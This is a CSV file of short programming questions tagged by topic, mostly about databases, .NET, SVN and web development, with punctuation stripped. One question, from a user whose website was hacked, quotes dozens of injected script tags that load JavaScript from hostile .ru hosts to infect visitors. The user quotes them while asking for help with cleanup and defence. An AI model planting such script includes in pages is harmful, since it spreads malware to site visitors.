Id,Title,Tag
80,sqlstatementexecute  multiple queries in one statement ive written a database generation script in sql and want to execute it in my adobe air applicationcreate table trole       roleid integer primary key      rolename varchar40create table tfile     fileid integer primary key    filename varchar50    filedescription varchar500    thumbnailid integer    fileformatid integer    categoryid integer    isfavorite boolean    dateadded date    globalaccesscount integer    lastaccesstime date    downloadcomplete boolean    isnew boolean    isspotlight boolean    duration varchar30create table tcategory     categoryid integer primary key    categoryname varchar50    parentcategoryid integeri execute this in adobe air using the following methodspublic static function runsqlfromfilefilenamestringvoid     var filefile  fileapplicationdirectoryresolvepathfilename    var streamfilestream  new filestream    streamopenfile filemoderead    var strsqlstring  streamreadutfbytesstreambytesavailable    nonquerystrsqlpublic static function nonquerystrsqlstringvoid    var sqlconnectionsqlconnection  new sqlconnection    sqlconnectionopenfileapplicationstoragedirectoryresolvepathdbpath    var sqlstatementsqlstatement  new sqlstatement    sqlstatementtext  strsql    sqlstatementsqlconnection  sqlconnection    try            sqlstatementexecute        catch errorsqlerror            alertshowerrortostring    no errors are generated however only trole exists it seems that it only looks at the first query up to the semicolon if i remove it the query fails is there a way to call multiple queries in one statement,flex
90,good branching and merging tutorials for tortoisesvn are there any really good tutorials explaining branching and merging with apache subversion all the better if its specific to tortoisesvn client,svn
120,aspnet site maps has anyone got experience creating sqlbased aspnet sitemap providersive got the default xml file websitemap working properly with my menu and sitemappath controls but ill need a way for the users of my site to create and modify pages dynamicallyi need to tie page viewing permissions into the standard aspnet membership system as well,sql
180,function for creating color wheels this is something ive pseudosolved many times and never quite found a solution thats stuck with me the problem is to come up with a way to generate n colors that are as distinguishable as possible where n is a parameter,algorithm
260,adding scripting functionality to net applications i have a little game written in c it uses a database as backend its a trading card game and i wanted to implement the function of the cards as a scriptwhat i mean is that i essentially have an interface icard which a card class implements public class card056  icard and which contains function that are called by the gamenow to make the thing maintainablemoddable i would like to have the class for each card as source code in the database and essentially compile it on first use so when i have to addchange a card ill just add it to the database and tell my application to refresh without needing any assembly deployment especially since we would be talking about 1 assembly per card which means hundreds of assembliesis that possible register a class from a source file and then instantiate it etcicard cardscurrent  new mygamecardlibrarycard056cardscurrentonenterplayref currentgamestatethe language is c but extra bonus if its possible to write the script in any net language,c#
330,should i use nested classes in this case i am working on a collection of classes used for video playback and recording i have one main class which acts like the public interface with methods like play stop pause record etc then i have workhorse classes which do the video decoding and video encoding i just learned about the existence of nested classes in c and im curious to know what programmers think about using them i am a little wary and not really sure what the benefitsdrawbacks are but they seem according to the book im reading to be used in cases such as minethe book suggests that in a scenario like mine a good solution would be to nest the workhorse classes inside the interface class so there are no separate files for classes the client is not meant to use and to avoid any possible naming conflicts i dont know about these justifications nested classes are a new concept to me just want to see what programmers think about the issue,c++
470,homegrown consumption of web services ive been writing a few web services for a net app now im ready to consume them ive seen numerous examples where there is homegrown code for consuming the service as opposed to using the auto generated methods visual studio creates when adding the web reference is there some advantage to this,.net
580,deploying sql server databases from test to live i wonder how you guys manage deployment of a database between 2 sql servers specifically sql server 2005now there is a development and a live one as this should be part of a buildscript standard windows batch even do with current complexity of those scripts i might switch to powershell or so later enterprise managermanagement studio express do not countwould you just copy the mdf file and attach it i am always a bit careful when working with binary data as this seems to be a compatiblity issue even though development and live should run the same version of the server at all timeor  given the lack of explain create table in tsql  do you do something that exports an existing database into sqlscripts which you can run on the target server if yes is there a tool that can automatically dump a given database into sql queries and that runs off the command line again enterprise managermanagement studio express do not countand lastly  given the fact that the live database already contains data the deployment may not involve creating all tables but rather checking the difference in structure and alter table the live ones instead which may also need data verificationconversion when existing fields changenow i hear a lot of great stuff about the red gate products but for hobby projects the price is a bit steepso what are you using to automatically deploy sql server databases from test to live,sql-server
650,automatically update version number i would like the version property of my application to be incremented for each build but im not sure on how to enable this functionality in visual studio 20052008 i have tried to specify the assemblyversion as 10 but it doesnt get me exactly what i want im also using a settings file and in earlier attempts when the assembly version changed my settings got reset to the default since the application looked for the settings file in another directory i would like to be able to display a version number in the form of 1138 so when a user finds a problem i can log the version they are using as well as tell them to upgrade if they have an old releasea short explanation of how the versioning works would also be appreciated when does the build and revision number get incremented,c#
810,visual studio setup project  per user registry settings im trying to maintain a setup project in visual studio 2003 yes its a legacy application the problem we have at the moment is that we need to write registry entries to hkcu for every user on the computer they need to be in the hkcu rather than hklm because they are the default user settings and they do change per user my feeling is thatthis isnt possiblethis isnt something the installer should be doing but something the application should be doing after all what happens when a user profile is created after the installwith that in mind i still want to change as little as possible in the application so my question is is it possible to add registry entries for every user in a visual studio 2003 setup project and at the moment the project lists five registry root keys hkeyclassesroot hkeycurrentuser hkeylocalmachine hkeyusers and usermachine hive i dont really know anything about the users root key and havent seen usermachine hive can anyone enlighten me on what they are perhaps they could solve my problem above,windows
930,how do i connect to a database and loop over a recordset in c whats the simplest way to connect and query a database for a set of records in c,c#
1010,how to get the value of built encoded viewstate i need to grab the base64encoded representation of the viewstate obviously this would not be available until fairly late in the request lifecycle which is okfor example if the output of the page includesltinput typehidden nameviewstate   idviewstate valuewepdwujodu0njc5md gti need a way on the server side to get the value wepdwujodu0njc5mdto clarify i need this value when the page is being rendered not on postback eg i need to know the viewstate value that is being sent to the client not the viewstate im getting back from them,c#
1040,how do i delete a file which is locked by another process in c im looking for a way to delete a file which is locked by another process using c i suspect the method must be able to find which process is locking the file perhaps by tracking the handles although im not sure how to do this in c then close that process before being able to complete the file delete using filedelete,c#
1070,process size on unix what is the correct way to get the process size on solaris hpux and aix should we use top or ps o vsz or something else,unix
1160,use svn revision to label build in ccnet i am using ccnet on a sample project with svn as my source control ccnet is configured to create a build on every check in ccnet uses msbuild to build the source codei would like to use the latest revision number to generate assemblyinfocs while compilinghow can i retrieve the latest revision from subversion and use the value in ccnetedit im not using nant  only msbuild,svn
1180,how to make subdomain user accounts in a webapp i am looking to allow users to control of subdomain of an app i am toying with much like basecamp where it is customusernameseeworkcomwhat is required on the dns end to allow these to be created dynamically and be available instantly and how do you recommend dealing with this in the logic of the site htaccess rule to  lookup the subdomain in the db,web-applications
1300,is nant still supported and suitable for net 35vs2008 i am using msbuild to build my stuff i want to use cruisecontrolnet as by build servernow ccnet refers nant a lot but it looks as if ccnet can do most of the stuff nant could do through the project configuration and msbuild also nant seems a bit unsupported with a beta release that is almost a year old nowin short i am actually quite happy with msbuild especially since its the official compiler front end and a bit uncomfortable with nant but i do not want to judge prematurelywhat would be reasons to use nant over msbuild especially with ccnet which seems to overlap a bit with nant in terms of features and adding the automated build related stuff,.net
1390,is windows server 2008 server core appropriate for a sql server instance im setting up a dedicated sql server 2005 box on windows server 2008 this week and would like to pare it down to be as barebones as possible while still being fully functionalto that end the server core option sounds appealing but im not clear about whether or not i can run sql server on that sku  several services are addressed on the microsoft website but i dont see any indication about sql serverdoes anyone know definitively,sql-server
1600,what is the best way to copy a database i always create a new empty database after that backup and restore of the existing database into it but is this really the best way as it seems very error prone and over complicated for me,sql-server
1610,can i logically reorder columns in a table if im adding a column to a table in microsoft sql server can i control where the column is displayed logically in queriesi dont want to mess with the physical layout of columns on disk but i would like to logically group columns together when possible so that tools like sql server management studio list the contents of the table in a convenient wayi know that i can do this through sql management studio by going into their design mode for tables and dragging the order of columns around but id like to be able to do it in raw sql so that i can perform the ordering scripted from the command line,sql-server
1760,net unit testing packages getting back into a bit more net after a fewyears of not using it fulltime and wondering what the good unit testing packages are these daysim familiar with nunit a few years ago and have played briefly around with ironruby with the goal of getting something like rspec going but dont know much beyond thati realize i could google for this and call it a day but i believe im likely to get a better and more informed response from asking a question here suggestions,c#
1790,federated synced subversion servers is it possible to create federated subversion serversas in one server at location a and another at location b that sync up their local versions of the repository automatically  that way when someone at either location interacts with the repository they are accessing their respective local server and therefore has faster response times,svn
1970,what language do you use for postgresql triggers and stored procedures postgresql is interesting in that it supports several languages for writing stored procedures  which one do you use and why,sql
2120,convert hashbytes to varchar i want to get the md5 hash of a string value in sql server 2005 i do this with the following commandselect hashbytesmd5 helloworldhowever this returns a varbinary instead of a varchar value if i attempt to convert 0x68e109f0f40ca72a15e05cc22786f8e6 into a varchar i get h  instead of 68e109f0f40ca72a15e05cc22786f8e6is there any sqlbased solutionyes,sql
2250,datatable vs dataset i currently use a datatable to get results from a database which i can use in my codehowever many example on the web show using a dataset instead and accessing the tables through the collections methodis there any advantage performance wise or otherwise of using datasets or datatables as a storage method for sql results,c#
2300,how do i traverse a collection in classic asp i want to be able to dofor each thing in thingsend forclassic asp  not net,asp-classic
2530,how do you disable browser autocomplete on web form field  input tag how do you disable autocomplete in the major browsers for a specific input or form field,html
2540,good stllike library for c what are good libraries for c with datastructures like vectors deques stacks hashmaps treemaps sets etc plain c please and platformindependent,c
2550,what are effective options for embedding video in an aspnet web site a quick glance at the presentday internet would seem to indicate that adobe flash is the obvious choice for embedding video in a web page  is this accurate or are they other effective choices  does the choice of aspnet as a platform influence this decision,asp.net
2630,what are your favorite powershell cmdlets i just found n softwares free powershell netcmdlets and after playing with them i love the functionality they bring to the command line  so it raises the question what are your favorite cmdlets and how do you use them,powershell
2750,data verifications in gettersetter or elsewhere im wondering if its a good idea to make verifications in getters and setters or elsewhere in the codethis might surprise you be when it comes to optimizations and speeding up the code i think you should not make verifications in getters and setters but in the code where youre updating your files or database am i wrong,optimization
2770,global exception handling for winforms control when working on aspnet 11 projects i always used the globalasax to catch all errors im looking for a similar way to catch all exceptions in a windows forms user control which ends up being a hosted ie control what is the proper way to go about doing something like this,winforms
2780,converting arbg to rgb with alpha blending lets say that we have an argb colorcolor argb  colorfromargb127 69 12 255 light urplewhen this is painted on top of an existing color the colors will blend so when it is blended with white the resulting color is colorfromargb255 162 133 255the solution should work like thiscolor blend  colorwhite color argb  colorfromargb127 69 12 255 light urple      color rgb  torgbargb blend same as colorfromargb255 162 133 255what is torgbs implementation      ,c#
2840,paging sql server 2005 results how do i page results in sql server 2005i tried it in sql server 2000 but there was no reliable way to do this im now wondering if sql server 2005 has any built in methodwhat i mean by paging is for example if i list users by their username i want to be able to only return the first 10 records then the next 10 records and so onany help would be much appreciated,sql
2900,mysqlapache error in php mysql query i am getting the following error  access denied for user apachelocalhost using password nowhen using the following codeltphpincludeincludesconnectphpquery  select  from storyresult  mysqlqueryquery or diemysqlerrorecho lth1gtdelete storylth1gtif mysqlnumrowsresult gt 0     whilerow  mysqlfetchrowresult          echo ltbgtrow1ltbgtltspan alignrightgtlta hrefprocessdeletestoryphpidrow0gtdeleteltagtltspangt      echo ltbr gtltigtrow2ltigt    else    echo no stories availablegtthe connectphp file contains my mysql connect calls that are working fine with my insert queries in another portion of the software  if i comment out the result  mysqlquery line then it goes through to the else statement  so it is that line or the content in the ifi have been searching the net for any solutions and most seem to be related to too many mysql connections or that the user i am logging into mysql as does not have permission  i have checked both  i can still perform my other queries elsewhere in the software and i have verified that the account has the correct permissions,php
2970,my website got hacked what should i do my dad called me today and said people going to his website were getting 168 viruses trying to download to their computers he isnt technical at all and built the whole thing with a wysiwyg editori popped his site open and viewed the source and there was a line of javascript includes at the bottom of the source right before the closing html tag they included this file among many others httpwww98hsrujsjs lt turn off javascript before you go to that urlso i commented it out for now it turns out his ftp password was a plain dictionary word six letters long so we think thats how it got hacked weve changed his password to an 8 digit nonword string he wouldnt go for a passphrase since he is a huntnpeck typeri did a whois on 98hsru and found it is hosted from a server in chile there is actually an email address associated with it too but i seriously doubt this person is the culprit probably just some other site that got hackedi have no idea what to do at this point though as ive never dealt with this sort of thing before anyone have any suggestionshe was using plain jane unsecured ftp through webhost4lifecom i dont even see a way to do sftp on their site im thinking his username and password got interceptedso to make this more relevant to the community what are the steps you should takebest practices you should follow to protect your website from getting hackedfor the record here is the line of code that magically got added to his file and isnt in his file on his computer  ive left it commented out just to make absolute sure it wont do anything on this page although im sure jeff would guard against thisltscript srchttpwww98hsrujsjsgtltscriptgtltscript srchttpwww98hsrujsjsgtltscriptgtltscript srchttpwww98hsrujsjsgtltscriptgtltscript srchttpwww98hsrujsjsgtltscriptgtltscript srchttpwww98hsrujsjsgtltscriptgtltscript srchttpwww98hsrujsjsgtltscriptgtltscript srchttpwwwporvrujsjsgtltscriptgtltscript srchttpwww98hsrujsjsgtltscriptgtltscript srchttpwwwporvrujsjsgtltscriptgtltscript srchttpwww98hsrujsjsgtltscriptgtltscript srchttpwwwporvrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwww98hsrujsjsgtltscriptgtltscript srchttpwwwporvrujsjsgtltscriptgtltscript srchttpwww98hsrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwww98hsrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwporvrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwporvrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwporvrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwporvrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwporvrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwporvrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwporvrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwporvrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwporvrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwporvrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwporvrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwporvrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwporvrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwporvrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwporvrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwporvrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgtltscript srchttpwwwuhwcrujsjsgtltscriptgt,security
3150,how to set up unit testing for visual studio c im having trouble figuring out how to get the testing framework set up and usable in visual studio 2008 for c presumably with the builtin unit testing suiteany links or tutorials would be appreciated,c++
